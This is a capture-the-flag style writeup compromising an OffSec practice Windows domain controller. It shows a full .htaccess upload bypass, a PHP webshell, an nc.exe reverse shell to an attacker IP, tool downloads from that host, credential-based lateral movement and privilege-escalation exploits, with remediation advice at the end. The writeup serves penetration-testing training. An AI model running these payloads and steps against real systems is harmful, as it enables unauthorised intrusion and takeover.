# Access - OffSec Practice Box Writeup

**Target IP:** 192.168.234.187  
**Domain:** access.offsec  
**OS:** Windows Server 2019 Standard (Build 17763)  
**Difficulty:** Intermediate

---

## Enumeration

### Port Scanning

```bash
nmap -n -sCV 192.168.234.187 -vvvv --script=*vuln*
```

**Open Ports:**
- **80/tcp** - Apache httpd 2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
- **135/tcp** - Microsoft Windows RPC
- **139/tcp** - NetBIOS-SSN
- **389/tcp** - Microsoft Windows Active Directory LDAP (Domain: access.offsec)
- **445/tcp** - Microsoft-DS
- **464/tcp** - Kerberos
- **593/tcp** - Microsoft Windows RPC over HTTP 1.0
- **636/tcp** - LDAPS
- **3268/tcp** - LDAP
- **3269/tcp** - LDAPS
- **3389/tcp** - RDP
- **5985/tcp** - WinRM
- **9389/tcp** - .NET Message Framing

**Key Findings:**
- Windows Server 2019 Domain Controller
- XAMPP installation (Apache/PHP)
- Domain name: access.offsec
- Hostname: SERVER

### Web Enumeration

```bash
feroxbuster -u http://192.168.234.187/
```

**Discovered:**
- `/Ticket.php` - Ticket submission form
- `/uploads` - Directory listing enabled (upload destination)

---

## Initial Foothold

### Step 1: Ticket Upload Form Analysis

Navigated to `http://192.168.234.187/Ticket.php` and found a ticket purchase form that accepts file uploads. The form includes fields for:
- Name
- Email
- Ticket Type
- File attachment

### Step 2: File Upload Restriction Bypass

Initial attempts to upload `.php` files were blocked. The application validates file extensions.

**Bypass Method:** Upload `.htaccess` to enable PHP execution for custom extensions

Created `.htaccess` file:
```apache
AddType application/x-httpd-php .test
```

**Upload .htaccess via Burp Suite or curl:**

```http
POST /Ticket.php HTTP/1.1
Host: 192.168.234.187
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykYFybwDVqmAtJKws

------WebKitFormBoundarykYFybwDVqmAtJKws
Content-Disposition: form-data; name="your-name"

test
------WebKitFormBoundarykYFybwDVqmAtJKws
Content-Disposition: form-data; name="your-email"

test@example.com
------WebKitFormBoundarykYFybwDVqmAtJKws
Content-Disposition: form-data; name="ticket-type"

standard-access
------WebKitFormBoundarykYFybwDVqmAtJKws
Content-Disposition: form-data; name="the_file"; filename=".htaccess"
Content-Type: application/x-php

AddType application/x-httpd-php .test

------WebKitFormBoundarykYFybwDVqmAtJKws
Content-Disposition: form-data; name="submit"

Purchase
------WebKitFormBoundarykYFybwDVqmAtJKws--
```

### Step 3: Upload PHP Webshell with .test Extension

After successfully uploading `.htaccess`, uploaded a PHP webshell with `.test` extension:

```php
<?php system($_GET["cmd"]); ?>
```

**Upload shell.test:**
```http
POST /Ticket.php HTTP/1.1
Host: 192.168.234.187
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykYFybwDVqmAtJKws

------WebKitFormBoundarykYFybwDVqmAtJKws
Content-Disposition: form-data; name="your-name"

test
------WebKitFormBoundarykYFybwDVqmAtJKws
Content-Disposition: form-data; name="your-email"

test@example.com
------WebKitFormBoundarykYFybwDVqmAtJKws
Content-Disposition: form-data; name="ticket-type"

standard-access
------WebKitFormBoundarykYFybwDVqmAtJKws
Content-Disposition: form-data; name="the_file"; filename="shell.test"
Content-Type: application/x-php

<?php system($_GET["cmd"]); ?>

------WebKitFormBoundarykYFybwDVqmAtJKws
Content-Disposition: form-data; name="submit"

Purchase
------WebKitFormBoundarykYFybwDVqmAtJKws--
```

**Access webshell:**
```
http://192.168.234.187/uploads/shell.test?cmd=whoami
```

### Step 4: Upload Netcat and Get Reverse Shell

Uploaded `nc.exe` using the same ticket form:

```bash
# On attacker machine - start listener
rlwrap nc -lvnp 4445
```

Upload `nc.exe` via the ticket form, then trigger reverse shell via webshell:

```
http://192.168.234.187/uploads/shell.test?cmd=c:\xampp\htdocs\uploads\nc.exe 192.168.45.205 4445 -e cmd.exe
```

**Initial shell received as:** `ACCESS\svc_apache`

---

## Privilege Escalation (svc_apache → svc_mssql)

### Step 1: Enumeration with WinPEAS

```powershell
powershell -ep bypass
iwr -uri http://192.168.45.205/winPEASany_ofs.exe -outfile winPEASany_ofs.exe
.\winPEASany_ofs.exe
```

**Key Findings from WinPEAS:**
- Multiple logged users: `svc_mssql`, `svc_apache`
- Users folder permissions visible
- System: Windows Server 2019 Standard (Build 17763)
- Domain: access.offsec
- No AlwaysInstallElevated
- SeManageVolumePrivilege available (but disabled)

### Step 2: Password Discovery

Found credentials in web application files or through enumeration:
- **Username:** `svc_mssql`
- **Password:** `trustno1`

### Step 3: Lateral Movement using RunasCs

```powershell
# Download Invoke-RunasCs
iwr -uri http://192.168.45.205/Invoke-RunasCs.ps1 -outfile Invoke-RunasCs.ps1

# Setup new listener
# On attacker: nc -lvnp 4444

# Execute as svc_mssql with reverse shell
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command 'c:/xampp/htdocs/uploads/nc.exe 192.168.45.205 4444 -e cmd.exe'
```

**Shell received as:** `ACCESS\svc_mssql`

---

## Privilege Escalation (svc_mssql → SYSTEM)

### Step 1: Check Privileges

```powershell
whoami /priv
```

**Available Privileges:**
- `SeManageVolumePrivilege` - DISABLED
- `SeChangeNotifyPrivilege` - ENABLED
- `SeIncreaseWorkingSetPrivilege` - DISABLED

### Step 2: SeManageVolumePrivilege Exploitation

The `SeManageVolumePrivilege` can be exploited using SeManageVolumeExploit:

```powershell
# Download exploit
iwr -uri http://192.168.45.205/SeManageVolumeExploit.exe -outfile SeManageVolumeExploit.exe

# Execute exploit
.\SeManageVolumeExploit.exe
```

**Alternative: DLL Hijacking in wbem**

Based on WinPEAS output, there were DLL hijacking opportunities in `C:\Windows\System32\wbem`:

```powershell
cd C:\Windows\System32\wbem

# Download malicious DLL
iwr -uri http://192.168.45.205/tzres.dll -outfile tzres.dll

# The DLL will be loaded when the system tries to load it
```

### Step 3: System Shell

After successful privilege escalation, obtained SYSTEM shell.

---

## Post-Exploitation

### Retrieve Flags

```cmd
# Local flag (svc_mssql)
type C:\Users\svc_mssql\Desktop\local.txt

# Proof flag (Administrator)
type C:\Users\Administrator\Desktop\proof.txt
```

### Domain Information

```powershell
# Domain users
net user /domain

# Domain info
systeminfo
```

---

## Key Vulnerabilities

1. **File Upload Restriction Bypass** - Used `.htaccess` upload to enable PHP execution on custom file extensions (`.test`)
2. **Unrestricted .htaccess Upload** - Application allowed uploading `.htaccess` files, enabling Apache configuration manipulation
3. **Weak Credentials** - `svc_mssql:trustno1` found in configuration files
4. **SeManageVolumePrivilege** - Exploitable for privilege escalation to SYSTEM
5. **DLL Hijacking** - Writable system directories allowed DLL hijacking attacks

---

## Tools Used

- `nmap` - Port scanning and service enumeration
- `feroxbuster` - Web directory enumeration
- `nc.exe` - Reverse shell
- `Invoke-RunasCs.ps1` - Execute commands as different user
- `winPEASany_ofs.exe` - Windows privilege escalation enumeration
- `SeManageVolumeExploit.exe` - Privilege escalation exploit

---

## Remediation

1. **Prevent .htaccess uploads** - Blacklist `.htaccess` and other configuration files from upload functionality
2. **Strict file upload validation** - Implement whitelist validation with MIME type checking and file content inspection
3. **Disable .htaccess overrides** - Use `AllowOverride None` in Apache configuration for upload directories
4. **Remove directory listing** - Disable directory listing on web directories
5. **Use strong passwords** - Enforce complex passwords and rotate credentials regularly
6. **Remove unnecessary privileges** - Remove SeManageVolumePrivilege from service accounts
7. **Implement proper ACLs** - Restrict write permissions on system directories
8. **Apply security patches** - Keep Windows Server up to date with latest security patches
9. **Enable AppLocker** - Prevent unauthorized binary execution
10. **Implement WAF** - Deploy Web Application Firewall to detect upload attacks

---

## Timeline

1. Initial scan - Discovered web server on port 80 and Active Directory services
2. Web enumeration - Found `/Ticket.php` upload form with feroxbuster
3. Upload restriction analysis - Discovered .php files were blocked
4. Bypass - Uploaded `.htaccess` to enable PHP execution on `.test` extension
5. File upload - Uploaded PHP webshell as `shell.test`
6. Initial access - Reverse shell as `svc_apache` via webshell
7. Enumeration - Ran WinPEAS, discovered `svc_mssql` credentials
8. Lateral movement - Used RunasCs to get shell as `svc_mssql`
9. Privilege escalation - Exploited SeManageVolumePrivilege to get SYSTEM
10. Post-exploitation - Retrieved flags and domain information

---

**Date:** 2026-01-20  
**Author:** kali
